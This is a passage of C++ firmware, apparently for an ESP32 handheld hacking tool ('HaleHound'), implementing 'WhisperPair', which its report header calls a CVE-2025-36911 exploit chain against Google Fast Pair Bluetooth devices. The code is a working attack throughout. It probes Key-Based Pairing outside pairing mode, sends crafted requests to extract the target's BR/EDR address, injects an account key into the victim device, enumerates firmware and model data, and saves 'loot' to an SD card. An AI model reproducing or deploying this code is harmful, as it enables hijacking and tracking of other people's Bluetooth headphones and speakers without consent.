                      d.name, d.addrStr, d.rssi, d.modelId);
        #endif
    }

    wpDrawList();
}

// ─── GATT Probe ──────────────────────────────────────────────────────────
static void wpProbeDevice(int idx) {
    wpProbeIdx = idx;
    inResult = false;
    FPDevice& d = wpDevs[idx];
    wpNotifRx = false;
    d.result = WPR_UNREACHABLE;

    // Stop scan before GATT client operations
    if (pWpScan) pWpScan->stop();

    // Draw probe UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("[*] PROBING TARGET");
    tft.drawLine(5, 94, 180, 94, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 100);
    tft.print(d.name);
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 115);
    tft.print(d.addrStr);

    // Create or reuse GATT client
    if (!pWpClient) {
        pWpClient = BLEDevice::createClient();
        if (!pWpClient) {
            #if CYD_DEBUG
            Serial.println("[WP] Failed to create BLE client");
            #endif
            inResult = true;
            wpDrawResult();
            return;
        }
    }

    // Attempt GATT connection
    wpDrawProbeStatus(0, "Connecting...", HALEHOUND_HOTPINK);
    BLEAddress addr(d.addrStr);
    bool connected = pWpClient->connect(addr, d.addrType);

    if (!connected) {
        #if CYD_DEBUG
        Serial.printf("[WP] GATT connect failed: %s\n", d.addrStr);
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    wpDrawProbeStatus(0, "Connected!", HALEHOUND_MAGENTA);
    #if CYD_DEBUG
    Serial.printf("[WP] Connected to %s\n", d.addrStr);
    #endif

    // Discover Fast Pair service (try 128-bit then 16-bit UUID)
    wpDrawProbeStatus(1, "Finding FP service...", HALEHOUND_HOTPINK);
    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
    if (!pSvc) {
        pSvc = pWpClient->getService(wpFpUUID16);
    }

    if (!pSvc) {
        d.result = WPR_NO_SERVICE;
        pWpClient->disconnect();
        #if CYD_DEBUG
        Serial.println("[WP] Fast Pair service not found");
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    wpDrawProbeStatus(1, "FP Service FOUND!", HALEHOUND_MAGENTA);
    delay(200);

    // Find Key-Based Pairing characteristic
    wpDrawProbeStatus(2, "Finding KBP char...", HALEHOUND_HOTPINK);
    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);

    if (!pKbp) {
        d.result = WPR_NO_CHAR;
        pWpClient->disconnect();
        #if CYD_DEBUG
        Serial.println("[WP] KBP char not found — device appears patched");
        #endif
        inResult = true;
        wpDrawResult();
        return;
    }

    // KBP characteristic accessible outside pairing mode!
    wpDrawProbeStatus(2, "KBP Char FOUND!", HALEHOUND_HOTPINK);
    d.result = WPR_EXPOSED;

    #if CYD_DEBUG
    Serial.println("[WP] KBP characteristic accessible outside pairing mode!");
    #endif

    // Subscribe to notifications
    if (pKbp->canNotify()) {
        pKbp->registerForNotify(wpNotifyCb);
        delay(100);
    }

    // Write test KBP request (16 bytes)
    // Byte 0: Message type (0x00 = Key-Based Pairing Request)
    // Byte 1: Flags (0x40 = request provider BR/EDR address)
    // Bytes 4-9: Target BLE address from advertisement
    // Bytes 10-15: Random salt
    wpDrawProbeStatus(3, "Sending KBP request...", HALEHOUND_HOTPINK);

    uint8_t kbpReq[16];
    kbpReq[0] = 0x00;  // KBP Request message type
    kbpReq[1] = 0x40;  // Flags
    kbpReq[2] = 0x00;
    kbpReq[3] = 0x00;
    for (int i = 4; i < 16; i++) kbpReq[i] = (uint8_t)random(256);

    // Parse target address into request bytes 4-9
    uint8_t addrBytes[6];
    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &addrBytes[0], &addrBytes[1], &addrBytes[2],
           &addrBytes[3], &addrBytes[4], &addrBytes[5]);
    memcpy(&kbpReq[4], addrBytes, 6);

    // Write the request (try write-with-response first)
    if (pKbp->canWrite()) {
        pKbp->writeValue(kbpReq, 16, true);
    } else {
        pKbp->writeValue(kbpReq, 16, false);
    }

    // Wait up to 3 seconds for notification response
    wpDrawProbeStatus(3, "Waiting for response...", HALEHOUND_HOTPINK);
    unsigned long t0 = millis();
    while (millis() - t0 < 3000 && !wpNotifRx) {
        delay(50);
    }

    if (wpNotifRx) {
        d.result = WPR_VULNERABLE;
        wpDrawProbeStatus(3, "RESPONSE RECEIVED!", 0xF800);
        delay(500);
        #if CYD_DEBUG
        Serial.println("[WP] VULNERABLE — responded to KBP outside pairing mode!");
        #endif
    }

    // Disconnect
    pWpClient->disconnect();

    inResult = true;
    wpDrawResult();
}

// ─── Attack Log ──────────────────────────────────────────────────────────
static void wpAtkAddLog(const char* msg, uint16_t color) {
    if (wpAtkLogCount < WP_ATK_LOG_LINES) {
        strncpy(wpAtkLog[wpAtkLogCount], msg, WP_ATK_LOG_WIDTH - 1);
        wpAtkLog[wpAtkLogCount][WP_ATK_LOG_WIDTH - 1] = '\0';
        wpAtkLogColors[wpAtkLogCount] = color;
        wpAtkLogCount++;
    } else {
        for (int i = 0; i < WP_ATK_LOG_LINES - 1; i++) {
            memcpy(wpAtkLog[i], wpAtkLog[i + 1], WP_ATK_LOG_WIDTH);
            wpAtkLogColors[i] = wpAtkLogColors[i + 1];
        }
        strncpy(wpAtkLog[WP_ATK_LOG_LINES - 1], msg, WP_ATK_LOG_WIDTH - 1);
        wpAtkLog[WP_ATK_LOG_LINES - 1][WP_ATK_LOG_WIDTH - 1] = '\0';
        wpAtkLogColors[WP_ATK_LOG_LINES - 1] = color;
    }
}

static void wpDrawAtkLog() {
    int startY = 98;
    int lineH = 15;
    int drawCount = (wpAtkLogCount < WP_ATK_LOG_LINES) ? wpAtkLogCount : WP_ATK_LOG_LINES;
    tft.fillRect(0, startY, SCREEN_WIDTH, WP_ATK_LOG_LINES * lineH, HALEHOUND_BLACK);
    for (int i = 0; i < drawCount; i++) {
        tft.setTextColor(wpAtkLogColors[i]);
        tft.setCursor(5, startY + i * lineH);
        tft.print(wpAtkLog[i]);
    }
}

// ─── Attack Report Display ──────────────────────────────────────────────
static void wpDrawAttackReport() {
    if (wpProbeIdx < 0) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    if (atkResultPage == 0) {
        // ─── Page 1: Summary ─────────────────────────────────────────
        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
        tft.setTextColor(0xF800);
        tft.setCursor(5, 82);
        tft.print("ATTACK REPORT");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 24, 82);
        tft.print("1/2");
        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

        int y = 100;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("Target: ");
        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
        y += 12;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y); tft.print("BLE: ");
        tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
        y += 16;

        // BR/EDR address — prominent
        if (wpAtkResult.hasBrEdr) {
            tft.fillRoundRect(5, y, SCREEN_WIDTH - 10, 28, 3, HALEHOUND_DARK);
            tft.drawRoundRect(4, y - 1, SCREEN_WIDTH - 8, 30, 3, 0xF800);
            tft.setTextColor(0xF800);
            tft.setCursor(10, y + 3);
            tft.print("BR/EDR:");
            char brStr[20];
            snprintf(brStr, sizeof(brStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                     wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                     wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                     wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
            tft.setCursor(10, y + 15);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print(brStr);
            y += 34;
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(5, y);
            tft.print("BR/EDR: Not extracted");
            y += 14;
        }

        y += 2;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Phase 1: KBP Exploit");
        y += 12;

        for (int s = 0; s < 4; s++) {
            tft.setCursor(10, y);
            tft.setTextColor(HALEHOUND_VIOLET);
            tft.print(wpStrategies[s].name);
            tft.setCursor(130, y);
            if (wpAtkResult.strategyResults[s] == 2) {
                tft.setTextColor(0x07E0);
                tft.print("HIT");
            } else if (wpAtkResult.strategyResults[s] == 1) {
                tft.setTextColor(HALEHOUND_GUNMETAL);
                tft.print("---");
            } else {
                tft.setTextColor(HALEHOUND_GUNMETAL);
                tft.print("N/A");
            }
            y += 11;
        }

        y += 4;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Phase 2: ");
        if (wpAtkResult.acctKeyWritten) {
            tft.setTextColor(0x07E0);
            tft.print("Key INJECTED");
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("Key not written");
        }
        y += 14;

        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Phase 3: ");
        int intelCount = 0;
        if (wpAtkResult.hasPasskey) intelCount++;
        if (wpAtkResult.hasAdditional) intelCount++;
        if (wpAtkResult.hasModelId) intelCount++;
        if (wpAtkResult.hasFirmware) intelCount++;
        char intelStr[16];
        snprintf(intelStr, sizeof(intelStr), "%d chars found", intelCount);
        tft.setTextColor(intelCount > 0 ? 0x07E0 : HALEHOUND_GUNMETAL);
        tft.print(intelStr);

    } else {
        // ─── Page 2: Raw Data ────────────────────────────────────────
        tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
        tft.setTextColor(0xF800);
        tft.setCursor(5, 82);
        tft.print("RAW INTEL");
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCREEN_WIDTH - 24, 82);
        tft.print("2/2");
        tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

        int y = 100;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("KBP Response:");
        y += 12;

        if (wpAtkResult.kbpRespLen > 0) {
            char hexLine[42];
            for (int row = 0; row < 2; row++) {
                int pos = 0;
                for (int i = row * 8; i < (row + 1) * 8 && (size_t)i < wpAtkResult.kbpRespLen; i++) {
                    pos += snprintf(hexLine + pos, sizeof(hexLine) - pos,
                                    "%02X ", wpAtkResult.kbpResp[i]);
                }
                if (pos > 0) {
                    hexLine[pos] = '\0';
                    tft.setTextColor(HALEHOUND_HOTPINK);
                    tft.setCursor(10, y);
                    tft.print(hexLine);
                    y += 11;
                }
            }
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(10, y);
            tft.print("No response captured");
            y += 11;
        }

        y += 6;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Account Key:");
        y += 12;

        if (wpAtkResult.acctKeyWritten) {
            tft.drawBitmap(SCREEN_WIDTH - 22, y - 10, bitmap_icon_key, 16, 16, 0x07E0);
            char hexLine[42];
            for (int row = 0; row < 2; row++) {
                int pos = 0;
                for (int i = row * 8; i < (row + 1) * 8; i++) {
                    pos += snprintf(hexLine + pos, sizeof(hexLine) - pos,
                                    "%02X ", wpAtkResult.acctKey[i]);
                }
                hexLine[pos] = '\0';
                tft.setTextColor(HALEHOUND_HOTPINK);
                tft.setCursor(10, y);
                tft.print(hexLine);
                y += 11;
            }
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.setCursor(10, y);
            tft.print("Not written");
            y += 11;
        }

        y += 6;
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Firmware: ");
        if (wpAtkResult.hasFirmware) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.print(wpAtkResult.firmware);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            tft.print("Unknown");
        }
        y += 14;

        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(5, y);
        tft.print("Model ID: ");
        if (wpAtkResult.hasModelId) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            char midStr[12];
            snprintf(midStr, sizeof(midStr), "0x%02X%02X%02X",
                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                     wpAtkResult.modelIdBytes[2]);
            tft.print(midStr);
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL);
            char mhex[12];
            snprintf(mhex, sizeof(mhex), "0x%06X", d.modelId);
            tft.print(mhex);
        }
    }

    // Bottom navigation bar
    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);

    // SAVE button (left)
    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, HALEHOUND_DARK);
    tft.drawRoundRect(4, SCREEN_HEIGHT - 35, 72, 28, 4, HALEHOUND_MAGENTA);
    tft.drawBitmap(10, SCREEN_HEIGHT - 29, bitmap_icon_save, 16, 16, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(30, SCREEN_HEIGHT - 25);
    tft.print("SAVE");

    // Page nav (right)
    tft.setTextColor(HALEHOUND_VIOLET);
    if (atkResultPage == 0) {
        tft.setCursor(SCREEN_WIDTH - 55, SCREEN_HEIGHT - 25);
        tft.print("1/2");
        tft.drawBitmap(SCREEN_WIDTH - 22, SCREEN_HEIGHT - 29, bitmap_icon_RIGHT, 16, 16, HALEHOUND_VIOLET);
    } else {
        tft.drawBitmap(SCREEN_WIDTH - 60, SCREEN_HEIGHT - 29, bitmap_icon_LEFT, 16, 16, HALEHOUND_VIOLET);
        tft.setCursor(SCREEN_WIDTH - 38, SCREEN_HEIGHT - 25);
        tft.print("2/2");
    }
}

// ─── SD Card Loot Save ──────────────────────────────────────────────────
static void wpSaveLoot() {
    if (wpProbeIdx < 0) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    // Visual feedback — flash save button green immediately
    tft.fillRoundRect(5, SCREEN_HEIGHT - 34, 70, 26, 4, 0x07E0);
    tft.setTextColor(TFT_BLACK);
    tft.setCursor(15, SCREEN_HEIGHT - 25);
    tft.print("SAVING");

    #if CYD_DEBUG
    Serial.printf("[WP-SAVE] wpSaveLoot called — heap: %u\n", ESP.getFreeHeap());
    #endif

    spiDeselect();
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    if (!SD.begin(SD_CS)) {
        SPI.begin(18, 19, 23, SD_CS);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            #if CYD_DEBUG
            Serial.printf("[WP-SAVE] SD FAILED — heap: %u\n", ESP.getFreeHeap());
            #endif
            tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
            tft.setTextColor(0xF800);
            tft.setCursor(10, SCREEN_HEIGHT - 52);
            tft.print("SD card not found!");
            SD.end();
            return;
        }
    }

    if (!SD.exists("/wp_loot")) {
        SD.mkdir("/wp_loot");
    }

    char safeMac[18];
    strncpy(safeMac, d.addrStr, 17);
    safeMac[17] = '\0';
    for (int i = 0; i < 17; i++) {
        if (safeMac[i] == ':') safeMac[i] = '-';
    }

    char fname[48];
    snprintf(fname, sizeof(fname), "/wp_loot/%s_%lu.txt", safeMac, millis());

    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
        tft.setTextColor(0xF800);
        tft.setCursor(10, SCREEN_HEIGHT - 52);
        tft.print("File write failed!");
        SD.end();
        return;
    }

    f.println("========================================");
    f.println("  WHISPERPAIR ATTACK REPORT");
    f.println("  CVE-2025-36911 Exploit Chain");
    f.println("  HaleHound Edition");
    f.println("========================================");
    f.println();
    f.printf("Target:  %s\n", d.name);
    f.printf("BLE MAC: %s\n", d.addrStr);
    f.printf("RSSI:    %d dBm\n", d.rssi);
    f.printf("Model:   0x%06X\n", d.modelId);
    f.println();

    if (wpAtkResult.hasBrEdr) {
        f.printf("BR/EDR Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                 wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                 wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
    } else {
        f.println("BR/EDR Address: Not extracted");
    }
    f.println();

    f.println("-- Phase 1: KBP Exploit --");
    for (int s = 0; s < 4; s++) {
        const char* status = "N/A";
        if (wpAtkResult.strategyResults[s] == 2) status = "HIT";
        else if (wpAtkResult.strategyResults[s] == 1) status = "MISS";
        f.printf("  %s: %s\n", wpStrategies[s].name, status);
    }
    f.println();

    if (wpAtkResult.kbpRespLen > 0) {
        f.print("KBP Response: ");
        for (size_t i = 0; i < wpAtkResult.kbpRespLen; i++) {
            f.printf("%02X ", wpAtkResult.kbpResp[i]);
        }
        f.println();
    }
    f.println();

    f.println("-- Phase 2: Account Key --");
    if (wpAtkResult.acctKeyWritten) {
        f.print("  Key: ");
        for (int i = 0; i < 16; i++) {
            f.printf("%02X ", wpAtkResult.acctKey[i]);
        }
        f.println();
        f.println("  Status: INJECTED");
    } else {
        f.println("  Status: Not written");
    }
    f.println();

    f.println("-- Phase 3: Intel --");
    f.printf("  Passkey char: %s\n", wpAtkResult.hasPasskey ? "Found" : "Absent");
    f.printf("  AdditionalData: %s\n", wpAtkResult.hasAdditional ? "Found" : "Absent");
    if (wpAtkResult.hasModelId) {
        f.printf("  Model ID: 0x%02X%02X%02X\n",
                 wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                 wpAtkResult.modelIdBytes[2]);
    }
    if (wpAtkResult.hasFirmware) {
        f.printf("  Firmware: %s\n", wpAtkResult.firmware);
    }
    f.println();
    f.println("========================================");

    f.close();
    SD.end();

    // Show save confirmation on screen
    tft.fillRect(5, SCREEN_HEIGHT - 55, SCREEN_WIDTH - 10, 14, HALEHOUND_BLACK);
    tft.setTextColor(0x07E0);
    tft.setCursor(10, SCREEN_HEIGHT - 52);
    tft.print("Saved: ");
    char shortName[28];
    snprintf(shortName, sizeof(shortName), "/wp_loot/%.18s", safeMac);
    tft.print(shortName);
}

// ─── Main Attack Orchestrator ───────────────────────────────────────────
static void wpRunAttack() {
    if (wpProbeIdx < 0 || wpProbeIdx >= wpCount) return;
    FPDevice& d = wpDevs[wpProbeIdx];

    inAttack = true;
    inResult = false;
    wpAtkLogCount = 0;
    memset(&wpAtkResult, 0, sizeof(wpAtkResult));
    wpAtkResult.strategyUsed = -1;

    // Draw attack UI
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(0xF800);
    tft.setCursor(5, 82);
    tft.print("ATTACKING: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    String atkName = String(d.name).substring(0, 16);
    tft.print(atkName);
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, 0xF800);

    if (pWpScan) pWpScan->stop();

    wpAtkAddLog("Connecting...", HALEHOUND_HOTPINK);
    wpDrawAtkLog();

    if (!pWpClient) {
        pWpClient = BLEDevice::createClient();
    }
    if (!pWpClient) {
        wpAtkAddLog("Client create FAILED", 0xF800);
        wpDrawAtkLog();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    BLEAddress addr(d.addrStr);
    bool connected = pWpClient->connect(addr, d.addrType);
    if (!connected) {
        wpAtkAddLog("Connection FAILED", 0xF800);
        wpDrawAtkLog();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    wpAtkAddLog("Connected!", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

    // Find FP service
    wpAtkAddLog("Finding FP service...", HALEHOUND_HOTPINK);
    wpDrawAtkLog();

    BLERemoteService* pSvc = pWpClient->getService(wpFpUUID128);
    if (!pSvc) pSvc = pWpClient->getService(wpFpUUID16);

    if (!pSvc) {
        wpAtkAddLog("FP service NOT FOUND", 0xF800);
        wpDrawAtkLog();
        pWpClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    wpAtkAddLog("FP service found!", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

    // Find KBP characteristic
    BLERemoteCharacteristic* pKbp = pSvc->getCharacteristic(wpKbpUUID);
    if (!pKbp) {
        wpAtkAddLog("KBP char NOT FOUND", 0xF800);
        wpDrawAtkLog();
        pWpClient->disconnect();
        delay(2000);
        inAttack = false;
        inResult = true;
        wpDrawResult();
        return;
    }

    if (pKbp->canNotify()) {
        pKbp->registerForNotify(wpNotifyCb);
        delay(100);
    }

    wpAtkAddLog("KBP char ready", HALEHOUND_MAGENTA);
    wpDrawAtkLog();

    // Attack-phase UUIDs (stack locals to save DRAM)
    BLEUUID uuidPasskey("fe2c1235-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidAcctKey("fe2c1236-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidAdditional("fe2c1237-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidModelId("fe2c1233-8366-4814-8eb0-01de32100bea");
    BLEUUID uuidDevInfo((uint16_t)0x180A);
    BLEUUID uuidFwRev((uint16_t)0x2A26);

    // ─── Phase 1: Multi-Strategy KBP Exploit ─────────────────────
    wpAtkAddLog("--- PHASE 1: KBP EXPLOIT ---", 0xF800);
    wpDrawAtkLog();

    uint8_t addrBytes[6];
    sscanf(d.addrStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &addrBytes[0], &addrBytes[1], &addrBytes[2],
           &addrBytes[3], &addrBytes[4], &addrBytes[5]);

    for (int s = 0; s < 4; s++) {
        char logBuf[WP_ATK_LOG_WIDTH];
        snprintf(logBuf, sizeof(logBuf), "Strategy %d: %s", s + 1, wpStrategies[s].name);
        wpAtkAddLog(logBuf, HALEHOUND_HOTPINK);
        wpDrawAtkLog();

        uint8_t kbpReq[16];
        memset(kbpReq, 0, 16);
        kbpReq[0] = 0x00;  // KBP Request message type
        kbpReq[1] = wpStrategies[s].flags;
        memcpy(&kbpReq[4], addrBytes, 6);
        for (int i = 10; i < 16; i++) kbpReq[i] = (uint8_t)random(256);

        wpNotifRx = false;
        wpNotifLen = 0;

        if (pKbp->canWrite()) {
            pKbp->writeValue(kbpReq, 16, true);
        } else {
            pKbp->writeValue(kbpReq, 16, false);
        }

        unsigned long t0 = millis();
        while (millis() - t0 < 2000 && !wpNotifRx) {
            delay(50);
        }

        if (wpNotifRx) {
            wpAtkResult.strategyResults[s] = 2;
            snprintf(logBuf, sizeof(logBuf), "  RESPONSE! %d bytes", (int)wpNotifLen);
            wpAtkAddLog(logBuf, 0x07E0);
            wpDrawAtkLog();

            if (wpAtkResult.strategyUsed < 0) {
                wpAtkResult.strategyUsed = s;
                memcpy(wpAtkResult.kbpResp, wpNotifData, wpNotifLen);
                wpAtkResult.kbpRespLen = wpNotifLen;

                if (wpNotifLen >= 7) {
                    memcpy(wpAtkResult.brEdrAddr, &wpNotifData[1], 6);
                    wpAtkResult.hasBrEdr = true;
                    char brStr[32];
                    snprintf(brStr, sizeof(brStr), "BR/EDR: %02X:%02X:%02X:%02X:%02X:%02X",
                             wpAtkResult.brEdrAddr[0], wpAtkResult.brEdrAddr[1],
                             wpAtkResult.brEdrAddr[2], wpAtkResult.brEdrAddr[3],
                             wpAtkResult.brEdrAddr[4], wpAtkResult.brEdrAddr[5]);
                    wpAtkAddLog(brStr, 0xF800);
                    wpDrawAtkLog();
                }
            }
        } else {
            wpAtkResult.strategyResults[s] = 1;
            wpAtkAddLog("  No response", HALEHOUND_GUNMETAL);
            wpDrawAtkLog();
        }

        delay(300);
    }

    wpAtkResult.phase1Done = true;

    // ─── Phase 2: Account Key Injection ──────────────────────────
    wpAtkAddLog("--- PHASE 2: ACCT KEY ---", 0xF800);
    wpDrawAtkLog();

    BLERemoteCharacteristic* pAcctKey = pSvc->getCharacteristic(uuidAcctKey);
    if (pAcctKey) {
        for (int i = 0; i < 16; i++) {
            wpAtkResult.acctKey[i] = (uint8_t)random(256);
        }

        wpAtkAddLog("Writing Account Key...", HALEHOUND_HOTPINK);
        wpDrawAtkLog();

        if (pAcctKey->canWrite()) {
            pAcctKey->writeValue(wpAtkResult.acctKey, 16, true);
        } else {
            pAcctKey->writeValue(wpAtkResult.acctKey, 16, false);
        }

        wpAtkResult.acctKeyWritten = true;
        wpAtkAddLog("Account Key INJECTED!", 0x07E0);
        wpDrawAtkLog();
    } else {
        wpAtkAddLog("AcctKey char not found", HALEHOUND_GUNMETAL);
        wpDrawAtkLog();
    }

    wpAtkResult.phase2Done = true;

    // ─── Phase 3: Characteristic Enumeration ─────────────────────
    wpAtkAddLog("--- PHASE 3: INTEL ---", 0xF800);
    wpDrawAtkLog();

    // Passkey char
    BLERemoteCharacteristic* pPk = pSvc->getCharacteristic(uuidPasskey);
    wpAtkResult.hasPasskey = (pPk != nullptr);
    wpAtkAddLog(pPk ? "Passkey char: FOUND" : "Passkey char: absent",
                pPk ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    wpDrawAtkLog();

    // Additional Data char
    BLERemoteCharacteristic* pAd = pSvc->getCharacteristic(uuidAdditional);
    wpAtkResult.hasAdditional = (pAd != nullptr);
    wpAtkAddLog(pAd ? "AdditionalData: FOUND" : "AdditionalData: absent",
                pAd ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
    wpDrawAtkLog();

    // Model ID char
    BLERemoteCharacteristic* pMid = pSvc->getCharacteristic(uuidModelId);
    if (pMid && pMid->canRead()) {
        std::string mv = pMid->readValue();
        if (mv.length() >= 3) {
            memcpy(wpAtkResult.modelIdBytes, mv.data(), 3);
            wpAtkResult.hasModelId = true;
            char midStr[32];
            snprintf(midStr, sizeof(midStr), "Model ID: 0x%02X%02X%02X",
                     wpAtkResult.modelIdBytes[0], wpAtkResult.modelIdBytes[1],
                     wpAtkResult.modelIdBytes[2]);
            wpAtkAddLog(midStr, HALEHOUND_MAGENTA);
        } else {
            wpAtkAddLog("Model ID: short read", HALEHOUND_GUNMETAL);
        }
    } else {
        wpAtkAddLog("Model ID: not readable", HALEHOUND_GUNMETAL);
    }
    wpDrawAtkLog();

    // Firmware Revision (Device Info Service 0x180A, char 0x2A26)
    BLERemoteService* pDis = pWpClient->getService(uuidDevInfo);
    if (pDis) {
        BLERemoteCharacteristic* pFw = pDis->getCharacteristic(uuidFwRev);
        if (pFw && pFw->canRead()) {
            std::string fv = pFw->readValue();
            if (fv.length() > 0) {
                size_t copyLen = fv.length();
                if (copyLen > 19) copyLen = 19;
                memcpy(wpAtkResult.firmware, fv.data(), copyLen);
                wpAtkResult.firmware[copyLen] = '\0';
                wpAtkResult.hasFirmware = true;
                char fwStr[42];
                snprintf(fwStr, sizeof(fwStr), "FW: %.19s", wpAtkResult.firmware);
                wpAtkAddLog(fwStr, HALEHOUND_MAGENTA);
            }
        } else {
            wpAtkAddLog("FW Rev: not readable", HALEHOUND_GUNMETAL);
        }
    } else {
        wpAtkAddLog("DevInfo svc: absent", HALEHOUND_GUNMETAL);
    }
    wpDrawAtkLog();

    wpAtkResult.phase3Done = true;

    // Disconnect
    pWpClient->disconnect();

    wpAtkAddLog("=== ATTACK COMPLETE ===", 0xF800);
    wpDrawAtkLog();
    delay(1500);

    inAttack = false;
    inAttackResult = true;
    atkResultPage = 0;
    wpDrawAttackReport();
}

// ─── Public Interface ────────────────────────────────────────────────────
void setup() {
    if (wpInit) return;

    #if CYD_DEBUG
    Serial.println("[WP] WhisperPair Scanner initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    wpDrawHeader();

    // Tear down WiFi before BLE init — frees radio + heap if WiFi was active
    WiFi.mode(WIFI_OFF);
    delay(50);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    pWpScan = BLEDevice::getScan();
    if (!pWpScan) {
        Serial.println("[WP] getScan() returned NULL");
        wpExit = true;
        return;
    }

    pWpScan->setActiveScan(true);
    pWpScan->setInterval(100);
    pWpScan->setWindow(99);

    wpCount = 0;
    wpCurIdx = 0;
    wpListStart = 0;
    wpProbeIdx = -1;
    wpExit = false;
    inResult = false;
    pWpClient = nullptr;
    wpInit = true;

    wpDoScan();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.printf("[WP] Init complete — %d FP devices found\n", wpCount);
    #endif
}

void loop() {
    if (!wpInit) return;

    // Delegate to loot viewer when active
    if (inLootViewer) {
        WPLootViewer::loop();
        if (WPLootViewer::isExitRequested()) {
            WPLootViewer::cleanup();
            inLootViewer = false;
            waitForTouchRelease();   // Prevent back-tap from bleeding into WhisperPair
            tft.fillScreen(HALEHOUND_BLACK);
            drawStatusBar();
            wpDrawHeader();
            wpDrawList();
        }
        return;
    }

    touchButtonsUpdate();

    // Icon bar touch handling
    static unsigned long lastTap = 0;
    if (millis() - lastTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                if (tx >= 10 && tx < 26) {
                    // Back icon
                    if (inAttackResult) {
                        inAttackResult = false;
                        inResult = true;
